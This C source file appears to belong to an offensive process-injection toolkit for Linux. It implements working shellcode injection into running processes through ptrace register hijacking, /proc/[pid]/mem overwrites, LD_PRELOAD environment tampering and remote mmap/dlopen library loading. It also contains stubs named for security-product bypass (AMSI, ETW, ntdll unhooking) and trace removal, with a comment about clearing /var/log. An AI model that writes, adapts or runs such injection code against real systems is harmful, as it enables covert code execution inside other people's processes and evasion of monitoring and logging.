/*
 * Linux Process Injection Implementation
 * Advanced techniques using ptrace, /proc/mem, and library injection
 */

#ifdef PLATFORM_LINUX

#define _GNU_SOURCE  // For lseek64 and other GNU extensions
#include "inject_core.h"
#include "inject_linux.h"
#include "../core/utils.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <dlfcn.h>  // For Dl_info

// x64 syscall numbers
#define __NR_memfd_create 319
#define __NR_process_vm_readv 310
#define __NR_process_vm_writev 311

// Get process information
inject_status_t inject_get_process_info(uint32_t pid, inject_process_info_t* info) {
    if (!info) {
        return INJECT_ERROR_INVALID_PARAMS;
    }
    
    memset(info, 0, sizeof(inject_process_info_t));
    info->pid = pid;
    
    // Read /proc/[pid]/status for basic info
    char status_path[256];
    snprintf(status_path, sizeof(status_path), "/proc/%d/status", pid);
    
    FILE* status_file = fopen(status_path, "r");
    if (!status_file) {
        return INJECT_ERROR_PROCESS_NOT_FOUND;
    }
    
    char line[256];
    while (fgets(line, sizeof(line), status_file)) {
        if (strncmp(line, "Name:", 5) == 0) {
            sscanf(line, "Name:\t%255s", info->name);
        } else if (strncmp(line, "PPid:", 5) == 0) {
            sscanf(line, "PPid:\t%u", &info->ppid);
        } else if (strncmp(line, "Uid:", 4) == 0) {
            uid_t uid;
            sscanf(line, "Uid:\t%u", &uid);
            info->is_system = (uid == 0);
        } else if (strncmp(line, "Threads:", 8) == 0) {
            sscanf(line, "Threads:\t%u", &info->thread_count);
        }
    }
    
    fclose(status_file);
    
    // Read executable path
    char exe_path[256];
    snprintf(exe_path, sizeof(exe_path), "/proc/%d/exe", pid);
    
    ssize_t len = readlink(exe_path, info->path, sizeof(info->path) - 1);
    if (len > 0) {
        info->path[len] = '\0';
    }
    
    // Check architecture
    char maps_path[256];
    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
    
    FILE* maps_file = fopen(maps_path, "r");
    if (maps_file) {
        // Check first executable mapping
        while (fgets(line, sizeof(line), maps_file)) {
            if (strstr(line, "r-xp") && strstr(line, info->path)) {
                unsigned long start, end;
                sscanf(line, "%lx-%lx", &start, &end);
                info->base_address = start;
                
                // Simple check: if addresses are > 32-bit, it's 64-bit
                info->is_64bit = (start > 0xFFFFFFFF);
                break;
            }
        }
        fclose(maps_file);
    }
    
    return INJECT_SUCCESS;
}

// Enumerate processes
inject_status_t inject_enum_processes(inject_process_info_t** processes, uint32_t* count) {
    if (!processes || !count) {
        return INJECT_ERROR_INVALID_PARAMS;
    }
    
    DIR* proc_dir = opendir("/proc");
    if (!proc_dir) {
        return INJECT_ERROR_GENERIC;
    }
    
    // Count processes
    uint32_t proc_count = 0;
    struct dirent* entry;
    
    while ((entry = readdir(proc_dir)) != NULL) {
        // Check if directory name is a PID
        char* endptr;
        strtol(entry->d_name, &endptr, 10);
        if (*endptr == '\0') {
            proc_count++;
        }
    }
    
    // Allocate array
    *processes = (inject_process_info_t*)calloc(proc_count, sizeof(inject_process_info_t));
    if (!*processes) {
        closedir(proc_dir);
        return INJECT_ERROR_ALLOCATION_FAILED;
    }
    
    // Fill process info
    rewinddir(proc_dir);
    uint32_t index = 0;
    
    while ((entry = readdir(proc_dir)) != NULL && index < proc_count) {
        char* endptr;
        pid_t pid = strtol(entry->d_name, &endptr, 10);
        if (*endptr == '\0') {
            inject_get_process_info(pid, &(*processes)[index]);
            index++;
        }
    }
    
    *count = index;
    closedir(proc_dir);
    
    return INJECT_SUCCESS;
}

// Parse /proc/[pid]/maps
inject_status_t inject_parse_proc_maps(pid_t pid, linux_memory_region_t** regions, int* count) {
    if (!regions || !count) {
        return INJECT_ERROR_INVALID_PARAMS;
    }
    
    char maps_path[256];
    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
    
    FILE* maps_file = fopen(maps_path, "r");
    if (!maps_file) {
        return INJECT_ERROR_PROCESS_NOT_FOUND;
    }
    
    // Count regions
    int region_count = 0;
    char line[512];
    while (fgets(line, sizeof(line), maps_file)) {
        region_count++;
    }
    
    // Allocate array
    *regions = (linux_memory_region_t*)calloc(region_count, sizeof(linux_memory_region_t));
    if (!*regions) {
        fclose(maps_file);
        return INJECT_ERROR_ALLOCATION_FAILED;
    }
    
    // Parse regions
    rewind(maps_file);
    int index = 0;
    
    while (fgets(line, sizeof(line), maps_file) && index < region_count) {
        linux_memory_region_t* region = &(*regions)[index];
        
        char* saveptr;
        char* addr_range = strtok_r(line, " ", &saveptr);
        if (!addr_range) continue;
        
        // Parse address range
        sscanf(addr_range, "%lx-%lx", &region->start, &region->end);
        
        // Parse permissions
        char* perms = strtok_r(NULL, " ", &saveptr);
        if (perms) {
            strncpy(region->permissions, perms, 4);
            region->is_readable = (perms[0] == 'r');
            region->is_writable = (perms[1] == 'w');
            region->is_executable = (perms[2] == 'x');
            region->is_private = (perms[3] == 'p');
        }
        
        // Parse offset
        char* offset_str = strtok_r(NULL, " ", &saveptr);
        if (offset_str) {
            sscanf(offset_str, "%lx", &region->offset);
        }
        
        // Parse device
        char* device = strtok_r(NULL, " ", &saveptr);
        if (device) {
            strncpy(region->device, device, sizeof(region->device) - 1);
        }
        
        // Parse inode
        char* inode_str = strtok_r(NULL, " ", &saveptr);
        if (inode_str) {
            sscanf(inode_str, "%lu", &region->inode);
        }
        
        // Parse pathname (if any)
        char* pathname = strtok_r(NULL, "\n", &saveptr);
        if (pathname) {
            // Skip leading spaces
            while (*pathname == ' ' || *pathname == '\t') pathname++;
            strncpy(region->pathname, pathname, sizeof(region->pathname) - 1);
        }
        
        index++;
    }
    
    *count = index;
    fclose(maps_file);
    
    return INJECT_SUCCESS;
}

// ptrace injection implementation
inject_status_t inject_ptrace(inject_config_t* config) {
    if (!config || !config->payload || config->payload_size == 0) {
        return INJECT_ERROR_INVALID_PARAMS;
    }
    
    inject_status_t status = INJECT_SUCCESS;
    pid_t pid = config->target_pid;
    
    // Step 1: Attach to target process
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
        if (errno == EPERM) {
            return INJECT_ERROR_ACCESS_DENIED;
        }
        return INJECT_ERROR_GENERIC;
    }
    
    // Wait for process to stop
    int wait_status;
    if (waitpid(pid, &wait_status, 0) < 0) {
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return INJECT_ERROR_GENERIC;
    }
    
    // Step 2: Get current registers
    struct user_regs_struct orig_regs, regs;
    if (ptrace(PTRACE_GETREGS, pid, NULL, &orig_regs) < 0) {
        status = INJECT_ERROR_GENERIC;
        goto cleanup;
    }
    
    memcpy(&regs, &orig_regs, sizeof(regs));
    
    // Step 3: Find suitable memory region for shellcode
    linux_memory_region_t* regions = NULL;
    int region_count = 0;
    unsigned long target_addr = 0;
    
    status = inject_parse_proc_maps(pid, &regions, &region_count);
    if (status != INJECT_SUCCESS) {
        goto cleanup;
    }
    
    // Look for executable region (preferably in main executable)
    for (int i = 0; i < region_count; i++) {
        if (regions[i].is_executable && regions[i].is_writable) {
            target_addr = regions[i].start;
            break;
        }
    }
    
    // If no RWX region, use RX region and hope for the best
    if (target_addr == 0) {
        for (int i = 0; i < region_count; i++) {
            if (regions[i].is_executable) {
                target_addr = regions[i].start;
                break;
            }
        }
    }
    
    free(regions);
    
    if (target_addr == 0) {
        // Try to allocate new memory via mmap syscall
        status = inject_remote_mmap(pid, config->payload_size, 
                                   PROT_READ | PROT_WRITE | PROT_EXEC, &target_addr);
        if (status != INJECT_SUCCESS) {
            goto cleanup;
        }
    }
    
    // Step 4: Backup original code
    size_t backup_size = config->payload_size + 16;  // Extra for safety
    uint8_t* backup = (uint8_t*)malloc(backup_size);
    if (!backup) {
        status = INJECT_ERROR_ALLOCATION_FAILED;
        goto cleanup;
    }
    
    // Read original bytes
    for (size_t i = 0; i < config->payload_size; i += sizeof(long)) {
        long word = ptrace(PTRACE_PEEKDATA, pid, target_addr + i, NULL);
        if (errno != 0) {
            status = INJECT_ERROR_GENERIC;
            free(backup);
            goto cleanup;
        }
        memcpy(backup + i, &word, sizeof(long));
    }
    
    // Step 5: Write shellcode
    for (size_t i = 0; i < config->payload_size; i += sizeof(long)) {
        long word = 0;
        size_t copy_size = (i + sizeof(long) <= config->payload_size) ? 
                          sizeof(long) : (config->payload_size - i);
        memcpy(&word, config->payload + i, copy_size);
        
        if (ptrace(PTRACE_POKEDATA, pid, target_addr + i, word) < 0) {
            status = INJECT_ERROR_WRITE_FAILED;
            free(backup);
            goto cleanup;
        }
    }
    
    // Step 6: Set instruction pointer to shellcode
    #ifdef __x86_64__
        regs.rip = target_addr;
    #else
        regs.eip = target_addr;
    #endif
    
    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0) {
        status = INJECT_ERROR_EXECUTION_FAILED;
        
        // Try to restore original code
        for (size_t i = 0; i < config->payload_size; i += sizeof(long)) {
            long word = 0;
            memcpy(&word, backup + i, sizeof(long));
            ptrace(PTRACE_POKEDATA, pid, target_addr + i, word);
        }
        
        free(backup);
        goto cleanup;
    }
    
    // Step 7: Execute shellcode
    // The shellcode should have an int3 (breakpoint) at the end
    if (ptrace(PTRACE_CONT, pid, NULL, NULL) < 0) {
        status = INJECT_ERROR_EXECUTION_FAILED;
        free(backup);
        goto cleanup;
    }
    
    // Wait for breakpoint or signal
    if (config->flags & INJECT_FLAG_WAIT_COMPLETION) {
        waitpid(pid, &wait_status, 0);
        
        // Step 8: Restore original code and registers
        for (size_t i = 0; i < config->payload_size; i += sizeof(long)) {
            long word = 0;
            memcpy(&word, backup + i, sizeof(long));
            ptrace(PTRACE_POKEDATA, pid, target_addr + i, word);
        }
        
        ptrace(PTRACE_SETREGS, pid, NULL, &orig_regs);
    }
    
    free(backup);
    
cleanup:
    // Detach from process
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    
    return status;
}

// /proc/[pid]/mem injection
inject_status_t inject_proc_mem(inject_config_t* config) {
    if (!config || !config->payload || config->payload_size == 0) {
        return INJECT_ERROR_INVALID_PARAMS;
    }
    
    inject_status_t status = INJECT_SUCCESS;
    pid_t pid = config->target_pid;
    
    // Step 1: Parse memory maps to find suitable region
    linux_memory_region_t* regions = NULL;
    int region_count = 0;
    unsigned long target_addr = 0;
    size_t target_size = 0;
    
    status = inject_parse_proc_maps(pid, &regions, &region_count);
    if (status != INJECT_SUCCESS) {
        return status;
    }
    
    // Find executable region with enough space
    for (int i = 0; i < region_count; i++) {
        if (regions[i].is_executable) {
            size_t region_size = regions[i].end - regions[i].start;
            if (region_size >= config->payload_size) {
                target_addr = regions[i].start;
                target_size = region_size;
                break;
            }
        }
    }
    
    free(regions);
    
    if (target_addr == 0) {
        return INJECT_ERROR_ALLOCATION_FAILED;
    }
    
    // Step 2: Open /proc/[pid]/mem
    char mem_path[256];
    snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", pid);
    
    int mem_fd = open(mem_path, O_RDWR);
    if (mem_fd < 0) {
        if (errno == EACCES) {
            return INJECT_ERROR_ACCESS_DENIED;
        }
        return INJECT_ERROR_GENERIC;
    }
    
    // Step 3: Stop the process temporarily
    if (kill(pid, SIGSTOP) < 0) {
        close(mem_fd);
        return INJECT_ERROR_GENERIC;
    }
    
    // Wait for process to stop
    usleep(10000);  // 10ms
    
    // Step 4: Backup original code
    uint8_t* backup = (uint8_t*)malloc(config->payload_size);
    if (!backup) {
        kill(pid, SIGCONT);
        close(mem_fd);
        return INJECT_ERROR_ALLOCATION_FAILED;
    }
    
    // Seek to target address and read
    if (lseek64(mem_fd, target_addr, SEEK_SET) < 0) {
        free(backup);
        kill(pid, SIGCONT);
        close(mem_fd);
        return INJECT_ERROR_GENERIC;
    }
    
    ssize_t bytes_read = read(mem_fd, backup, config->payload_size);
    if (bytes_read != config->payload_size) {
        free(backup);
        kill(pid, SIGCONT);
        close(mem_fd);
        return INJECT_ERROR_GENERIC;
    }
    
    // Step 5: Write shellcode
    if (lseek64(mem_fd, target_addr, SEEK_SET) < 0) {
        free(backup);
        kill(pid, SIGCONT);
        close(mem_fd);
        return INJECT_ERROR_WRITE_FAILED;
    }
    
    ssize_t bytes_written = write(mem_fd, config->payload, config->payload_size);
    if (bytes_written != config->payload_size) {
        // Try to restore
        lseek64(mem_fd, target_addr, SEEK_SET);
        write(mem_fd, backup, config->payload_size);
        
        free(backup);
        kill(pid, SIGCONT);
        close(mem_fd);
        return INJECT_ERROR_WRITE_FAILED;
    }
    
    // Step 6: Resume process to execute shellcode
    kill(pid, SIGCONT);
    
    // Step 7: Wait for shellcode to complete if requested
    if (config->flags & INJECT_FLAG_WAIT_COMPLETION) {
        usleep(100000);  // 100ms for shellcode to run
        
        // Restore original code
        lseek64(mem_fd, target_addr, SEEK_SET);
        write(mem_fd, backup, config->payload_size);
    }
    
    free(backup);
    close(mem_fd);
    
    return INJECT_SUCCESS;
}

// LD_PRELOAD injection
inject_status_t inject_ld_preload(inject_config_t* config) {
    if (!config || !config->technique_params) {
        return INJECT_ERROR_INVALID_PARAMS;
    }
    
    // LD_PRELOAD requires modifying environment before exec
    // This is typically done by:
    // 1. Creating a wrapper script that sets LD_PRELOAD
    // 2. Using ptrace to modify environment
    // 3. Injecting into a child process
    
    inject_params_elf_t* params = (inject_params_elf_t*)config->technique_params;
    
    if (!params->so_path) {
        return INJECT_ERROR_INVALID_PARAMS;
    }
    
    pid_t pid = config->target_pid;
    
    // Method 1: Modify /proc/[pid]/environ (requires root usually)
    char environ_path[256];
    snprintf(environ_path, sizeof(environ_path), "/proc/%d/environ", pid);
    
    int env_fd = open(environ_path, O_RDWR);
    if (env_fd >= 0) {
        // Read current environment
        char env_buffer[4096] = {0};
        ssize_t bytes = read(env_fd, env_buffer, sizeof(env_buffer) - 256);
        
        if (bytes > 0) {
            // Append LD_PRELOAD
            char ld_preload[512];
            snprintf(ld_preload, sizeof(ld_preload), "LD_PRELOAD=%s", params->so_path);
            
            // Write back (this rarely works due to kernel restrictions)
            lseek(env_fd, 0, SEEK_SET);
            write(env_fd, ld_preload, strlen(ld_preload) + 1);
            write(env_fd, env_buffer, bytes);
            
            close(env_fd);
            
            // Force process to re-exec itself
            kill(pid, SIGUSR1);  // Custom signal handler needed
            
            return INJECT_SUCCESS;
        }
        
        close(env_fd);
    }
    
    // Method 2: Use ptrace to inject dlopen call
    // This is more reliable
    return inject_remote_dlopen(pid, params->so_path);
}

// Remote mmap via ptrace
inject_status_t inject_remote_mmap(pid_t pid, size_t size, int prot, unsigned long* addr) {
    if (!addr || size == 0) {
        return INJECT_ERROR_INVALID_PARAMS;
    }
    
    struct user_regs_struct orig_regs, regs;
    
    // Attach to process
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
        return INJECT_ERROR_ACCESS_DENIED;
    }
    
    waitpid(pid, NULL, 0);
    
    // Get registers
    if (ptrace(PTRACE_GETREGS, pid, NULL, &orig_regs) < 0) {
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return INJECT_ERROR_GENERIC;
    }
    
    memcpy(&regs, &orig_regs, sizeof(regs));
    
    // Setup syscall arguments for mmap
    #ifdef __x86_64__
        regs.rax = __NR_mmap;           // System call number
        regs.rdi = 0;                   // addr (NULL = let kernel choose)
        regs.rsi = size;                // length
        regs.rdx = prot;                // prot
        regs.r10 = MAP_PRIVATE | MAP_ANONYMOUS;  // flags
        regs.r8 = -1;                   // fd
        regs.r9 = 0;                    // offset
    #else
        // 32-bit not implemented yet
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return INJECT_ERROR_TECHNIQUE_UNSUPPORTED;
    #endif
    
    // Set registers
    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0) {
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return INJECT_ERROR_GENERIC;
    }
    
    // Execute syscall
    if (ptrace(PTRACE_SYSCALL, pid, NULL, NULL) < 0) {
        ptrace(PTRACE_SETREGS, pid, NULL, &orig_regs);
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return INJECT_ERROR_EXECUTION_FAILED;
    }
    
    waitpid(pid, NULL, 0);
    
    // Get result
    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0) {
        ptrace(PTRACE_SETREGS, pid, NULL, &orig_regs);
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return INJECT_ERROR_GENERIC;
    }
    
    #ifdef __x86_64__
        *addr = regs.rax;
    #endif
    
    // Restore original registers
    ptrace(PTRACE_SETREGS, pid, NULL, &orig_regs);
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    
    // Check if mmap succeeded
    if (*addr == (unsigned long)-1) {
        return INJECT_ERROR_ALLOCATION_FAILED;
    }
    
    return INJECT_SUCCESS;
}

// Remote dlopen via ptrace
inject_status_t inject_remote_dlopen(pid_t pid, const char* library_path) {
    if (!library_path) {
        return INJECT_ERROR_INVALID_PARAMS;
    }
    
    inject_status_t status = INJECT_SUCCESS;
    unsigned long dlopen_addr = 0;
    unsigned long string_addr = 0;
    
    // Find dlopen address in target process
    status = inject_find_function_address(pid, "libdl.so", "dlopen", &dlopen_addr);
    if (status != INJECT_SUCCESS) {
        // Try libc
        status = inject_find_function_address(pid, "libc.so", "dlopen", &dlopen_addr);
        if (status != INJECT_SUCCESS) {
            return status;
        }
    }
    
    // Allocate memory for library path string
    size_t path_len = strlen(library_path) + 1;
    status = inject_remote_mmap(pid, path_len, PROT_READ | PROT_WRITE, &string_addr);
    if (status != INJECT_SUCCESS) {
        return status;
    }
    
    // Write library path to target process
    inject_config_t write_config = {0};
    write_config.target_pid = pid;
    write_config.payload = (uint8_t*)library_path;
    write_config.payload_size = path_len;
    
    // Use ptrace to write string
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
        return INJECT_ERROR_ACCESS_DENIED;
    }
    
    waitpid(pid, NULL, 0);
    
    // Write string
    for (size_t i = 0; i < path_len; i += sizeof(long)) {
        long word = 0;
        size_t copy_size = (i + sizeof(long) <= path_len) ? 
                          sizeof(long) : (path_len - i);
        memcpy(&word, library_path + i, copy_size);
        
        if (ptrace(PTRACE_POKEDATA, pid, string_addr + i, word) < 0) {
            ptrace(PTRACE_DETACH, pid, NULL, NULL);
            return INJECT_ERROR_WRITE_FAILED;
        }
    }
    
    // Call dlopen(library_path, RTLD_NOW | RTLD_GLOBAL)
    struct user_regs_struct orig_regs, regs;
    
    if (ptrace(PTRACE_GETREGS, pid, NULL, &orig_regs) < 0) {
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return INJECT_ERROR_GENERIC;
    }
    
    memcpy(&regs, &orig_regs, sizeof(regs));
    
    // Setup call to dlopen
    #ifdef __x86_64__
        // Backup stack
        unsigned long orig_rsp = regs.rsp;
        regs.rsp -= 8;  // Align stack
        
        // Set up arguments
        regs.rdi = string_addr;           // library path
        regs.rsi = RTLD_NOW | RTLD_GLOBAL;  // flags
        regs.rip = dlopen_addr;           // dlopen address
        
        // Write return address (int3 for breakpoint)
        long int3 = 0xCC;
        ptrace(PTRACE_POKEDATA, pid, regs.rsp, int3);
    #endif
    
    // Set registers and continue
    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0) {
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return INJECT_ERROR_EXECUTION_FAILED;
    }
    
    if (ptrace(PTRACE_CONT, pid, NULL, NULL) < 0) {
        ptrace(PTRACE_SETREGS, pid, NULL, &orig_regs);
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return INJECT_ERROR_EXECUTION_FAILED;
    }
    
    // Wait for breakpoint
    waitpid(pid, NULL, 0);
    
    // Restore registers
    ptrace(PTRACE_SETREGS, pid, NULL, &orig_regs);
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    
    return INJECT_SUCCESS;
}

// Find function address in target process
inject_status_t inject_find_function_address(pid_t pid, const char* library, 
                                            const char* function, unsigned long* addr) {
    if (!library || !function || !addr) {
        return INJECT_ERROR_INVALID_PARAMS;
    }
    
    // Parse /proc/[pid]/maps to find library
    linux_memory_region_t* regions = NULL;
    int region_count = 0;
    unsigned long lib_base = 0;
    
    inject_status_t status = inject_parse_proc_maps(pid, &regions, &region_count);
    if (status != INJECT_SUCCESS) {
        return status;
    }
    
    // Find library base address
    for (int i = 0; i < region_count; i++) {
        if (strstr(regions[i].pathname, library)) {
            lib_base = regions[i].start;
            break;
        }
    }
    
    free(regions);
    
    if (lib_base == 0) {
        return INJECT_ERROR_GENERIC;
    }
    
    // In a real implementation, we would parse the ELF headers
    // to find the function offset. For now, use dlsym locally
    // and assume same offset (not always accurate)
    
    void* local_handle = dlopen(library, RTLD_LAZY);
    if (!local_handle) {
        return INJECT_ERROR_GENERIC;
    }
    
    void* local_func = dlsym(local_handle, function);
    if (!local_func) {
        dlclose(local_handle);
        return INJECT_ERROR_GENERIC;
    }
    
    // Calculate offset
    Dl_info info;
    if (dladdr(local_func, &info) == 0) {
        dlclose(local_handle);
        return INJECT_ERROR_GENERIC;
    }
    
    unsigned long offset = (unsigned long)local_func - (unsigned long)info.dli_fbase;
    *addr = lib_base + offset;
    
    dlclose(local_handle);
    
    return INJECT_SUCCESS;
}

// Check ptrace scope
inject_status_t inject_check_ptrace_scope(void) {
    FILE* f = fopen("/proc/sys/kernel/yama/ptrace_scope", "r");
    if (!f) {
        // Yama not present, ptrace should work
        return INJECT_SUCCESS;
    }
    
    int scope = 0;
    fscanf(f, "%d", &scope);
    fclose(f);
    
    if (scope == 0) {
        // Classic ptrace permissions
        return INJECT_SUCCESS;
    } else if (scope == 1) {
        // Restricted ptrace (only children)
        return INJECT_ERROR_ACCESS_DENIED;
    } else {
        // Admin only or disabled
        return INJECT_ERROR_ACCESS_DENIED;
    }
}

// Enumerate memory regions
inject_status_t inject_enum_memory_regions(uint32_t pid, memory_region_t** regions, uint32_t* count) {
    if (!regions || !count) {
        return INJECT_ERROR_INVALID_PARAMS;
    }
    
    linux_memory_region_t* linux_regions = NULL;
    int region_count = 0;
    
    inject_status_t status = inject_parse_proc_maps(pid, &linux_regions, &region_count);
    if (status != INJECT_SUCCESS) {
        return status;
    }
    
    // Convert to generic format
    *regions = (memory_region_t*)calloc(region_count, sizeof(memory_region_t));
    if (!*regions) {
        free(linux_regions);
        return INJECT_ERROR_ALLOCATION_FAILED;
    }
    
    for (int i = 0; i < region_count; i++) {
        (*regions)[i].base_address = linux_regions[i].start;
        (*regions)[i].region_size = linux_regions[i].end - linux_regions[i].start;
        (*regions)[i].is_executable = linux_regions[i].is_executable;
        (*regions)[i].is_writable = linux_regions[i].is_writable;
        strncpy((*regions)[i].module_name, linux_regions[i].pathname, 
               sizeof((*regions)[i].module_name) - 1);
    }
    
    *count = region_count;
    free(linux_regions);
    
    return INJECT_SUCCESS;
}

// Write memory using /proc/mem
inject_status_t inject_write_memory(uint32_t pid, uint64_t address, const uint8_t* data, size_t size) {
    if (!data || size == 0) {
        return INJECT_ERROR_INVALID_PARAMS;
    }
    
    char mem_path[256];
    snprintf(mem_path, sizeof(mem_path), "/proc/%u/mem", pid);
    
    int fd = open(mem_path, O_RDWR);
    if (fd < 0) {
        return INJECT_ERROR_ACCESS_DENIED;
    }
    
    if (lseek64(fd, address, SEEK_SET) < 0) {
        close(fd);
        return INJECT_ERROR_GENERIC;
    }
    
    ssize_t written = write(fd, data, size);
    close(fd);
    
    if (written != size) {
        return INJECT_ERROR_WRITE_FAILED;
    }
    
    return INJECT_SUCCESS;
}

// Read memory using /proc/mem
inject_status_t inject_read_memory(uint32_t pid, uint64_t address, uint8_t* buffer, size_t size) {
    if (!buffer || size == 0) {
        return INJECT_ERROR_INVALID_PARAMS;
    }
    
    char mem_path[256];
    snprintf(mem_path, sizeof(mem_path), "/proc/%u/mem", pid);
    
    int fd = open(mem_path, O_RDONLY);
    if (fd < 0) {
        return INJECT_ERROR_ACCESS_DENIED;
    }
    
    if (lseek64(fd, address, SEEK_SET) < 0) {
        close(fd);
        return INJECT_ERROR_GENERIC;
    }
    
    ssize_t bytes_read = read(fd, buffer, size);
    close(fd);
    
    if (bytes_read != size) {
        return INJECT_ERROR_GENERIC;
    }
    
    return INJECT_SUCCESS;
}

// Allocate memory (placeholder - uses ptrace mmap)
inject_status_t inject_allocate_memory(uint32_t pid, size_t size, uint32_t protection,
                                       alloc_strategy_t strategy, uint64_t* address) {
    if (!address || size == 0) {
        return INJECT_ERROR_INVALID_PARAMS;
    }
    
    // Convert protection flags
    int prot = 0;
    if (protection & 0x1) prot |= PROT_READ;
    if (protection & 0x2) prot |= PROT_WRITE;
    if (protection & 0x4) prot |= PROT_EXEC;
    
    unsigned long addr = 0;
    inject_status_t status = inject_remote_mmap(pid, size, prot, &addr);
    
    if (status == INJECT_SUCCESS) {
        *address = addr;
    }
    
    return status;
}

// Stubs for Windows-specific functions when on Linux
inject_status_t inject_unhook_ntdll(void) {
    // Not applicable on Linux
    return INJECT_SUCCESS;
}

inject_status_t inject_bypass_etw(void) {
    // ETW is Windows-specific
    return INJECT_SUCCESS;
}

inject_status_t inject_bypass_amsi(void) {
    // AMSI is Windows-specific
    return INJECT_SUCCESS;
}

inject_status_t inject_enable_debug_privilege(void) {
    // On Linux, use capabilities instead
    // This would require CAP_SYS_PTRACE
    return INJECT_SUCCESS;
}

inject_status_t inject_remove_traces(uint32_t pid) {
    // Basic trace removal on Linux
    // Could clear /var/log entries if root
    (void)pid;
    return INJECT_SUCCESS;
}

inject_status_t inject_setup_syscalls(void) {
    // Direct syscalls are always available on Linux
    return INJECT_SUCCESS;
}

#endif // PLATFORM_LINUX